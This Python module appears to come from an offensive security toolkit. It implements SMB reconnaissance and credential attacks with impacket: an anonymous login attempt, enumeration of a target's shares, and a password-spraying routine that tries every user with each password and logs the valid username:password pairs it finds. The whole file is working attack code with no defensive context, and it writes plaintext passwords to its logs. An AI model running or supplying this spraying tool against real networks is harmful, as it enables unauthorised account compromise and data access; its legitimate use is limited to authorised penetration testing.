# core/smb_enum.py

import logging
import time
from impacket.smbconnection import SMBConnection, SessionError

class SMBEnumerator:
    def __init__(self, target_ip, domain, logger=None):
        self.target_ip = target_ip
        self.domain = domain
        self.logger = logger or logging.getLogger(__name__)
        self.connection = None

        # Try to establish initial anonymous connection
        try:
            self.connection = SMBConnection(
                self.target_ip, self.target_ip, sess_port=445, timeout=5
            )
            self.connection.login('', '')  # anonymous login attempt
            self.logger.info(f"Anonymous SMB connection established to {self.target_ip}")
        except Exception as e:
            self.logger.error(f"Failed to establish SMB connection: {e}")
            self.connection = None

    def enumerate_shares(self):
        """
        Enumerate SMB shares on the target.
        Returns a list of share names.
        Raises exception if connection is not established.
        """
        if not self.connection:
            raise ConnectionError("No SMB connection established")

        shares = []
        try:
            for share in self.connection.listShares():
                name = share['shi1_netname']
                if isinstance(name, bytes):
                    name = name.decode('utf-8', errors='ignore')
                shares.append(name.rstrip('\x00'))
            self.logger.info(f"Enumerated {len(shares)} shares on {self.target_ip}")
            return shares
        except SessionError as e:
            self.logger.error(f"SMB session error while enumerating shares: {e}")
            return []
        except Exception as e:
            self.logger.error(f"Unexpected error enumerating SMB shares: {e}")
            return []

    def try_login(self, username, password):
        """
        Attempt SMB login with provided username and password.
        Returns True if successful, False otherwise.
        """
        self.logger.debug(f"Attempting SMB login for {username}@{self.domain} with password '{password}'")
        try:
            conn = SMBConnection(
                self.target_ip, self.target_ip, sess_port=445, timeout=5
            )
            conn.login(username, password, domain=self.domain)
            self.logger.info(f"SMB login succeeded for {username}@{self.domain}")
            conn.logoff()
            return True
        except SessionError as e:
            self.logger.debug(f"SMB login failed for {username}@{self.domain}: {e}")
            return False
        except Exception as e:
            self.logger.warning(f"Error during SMB login attempt for {username}@{self.domain}: {e}")
            return False

    def spray_credentials(self, user_list, password_list, max_delay=0.5):
        """
        Attempt password spraying by iterating over all users for each password.
        Adds per-attempt logging and optional delay.

        Args:
            user_list (List[str]): List of usernames
            password_list (List[str]): List of passwords
            max_delay (float): Delay in seconds between attempts (default 0.5s)
        """
        total_attempts = 0
        success_count = 0
        for password in password_list:
            for username in user_list:
                total_attempts += 1
                success = self.try_login(username, password)
                if success:
                    success_count += 1
                    self.logger.success(f"Valid credentials found: {username}:{password}")
                time.sleep(max_delay)

        self.logger.info(f"Password spray complete: {total_attempts} attempts, {success_count} valid.")

